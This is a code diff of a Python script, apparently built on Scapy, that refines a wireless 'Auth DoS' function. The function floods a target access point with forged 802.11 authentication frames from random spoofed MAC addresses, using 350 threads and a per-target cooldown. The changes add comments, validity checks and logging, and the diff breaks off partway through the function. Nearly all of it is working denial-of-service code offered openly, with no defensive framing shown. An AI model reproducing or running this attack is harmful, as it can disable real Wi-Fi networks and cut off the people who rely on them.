@@ -334,12 +334,15 @@ def start_sniffing_thread(iface_name):
     sniff_thread.start()
     logger.info(f"Sniffing started on interface {iface_name}")
 
-last_attack_time = {}
+# Lock to ensure that multiple threads don't perform the attack simultaneously
 attack_time_lock = threading.Lock()
+
+# Store the last attack time for each BSSID
+last_attack_time = {}
 
 def start_auth_dos(bssid, iface_name):
     """Perform Authentication DoS attack by sending fake authentication frames."""
-
+    
     def get_random_mac():
         """Generate a random MAC address."""
         return ':'.join([''.join(random.choices('0123456789ABCDEF', k=2)) for _ in range(6)]).upper()
@@ -347,13 +350,28 @@ def start_auth_dos(bssid, iface_name):
     def send_auth_frame():
         """Send a fake authentication frame."""
         try:
+            # Ensure that BSSID and iface_name are valid
+            if not bssid or not iface_name:
+                logging.error(f"Invalid BSSID or interface: bssid={bssid}, iface_name={iface_name}")
+                return
+
+            # Generate a random fake MAC address
             fake_mac = get_random_mac()
+            logging.debug(f"Generated fake MAC: {fake_mac}")
+
+            # Create the fake authentication frame
             auth_frame = RadioTap() / Dot11(addr1=bssid, addr2=fake_mac, addr3=bssid) / Dot11Auth(seqnum=1, status=0)
+
+            # Send the frame
             sendp(auth_frame, iface=iface_name, verbose=False)
+            logging.debug(f"Sent Auth frame to BSSID: {bssid} with fake MAC: {fake_mac}")
+        
         except Exception as e:
-            logging.error(f"Error sending frame: {e}")
+            logging.error(f"Error sending frame: {e}, BSSID: {bssid}, Interface: {iface_name}")
 
     current_time = time.time()
+    
+    # Ensure that the attack is not repeated within 20 seconds
     with attack_time_lock:
         if bssid in last_attack_time and (current_time - last_attack_time[bssid]) < 20:
             logging.info(f"Skipping Auth DoS on BSSID {bssid}. Attack already performed recently.")
@@ -362,7 +380,6 @@ def start_auth_dos(bssid, iface_name):
         last_attack_time[bssid] = current_time
 
     num_threads = 350  # Number of threads for the attack
-
     logging.info(f"Starting Auth DoS on BSSID {bssid} with {num_threads} threads...")
 
     threads = []
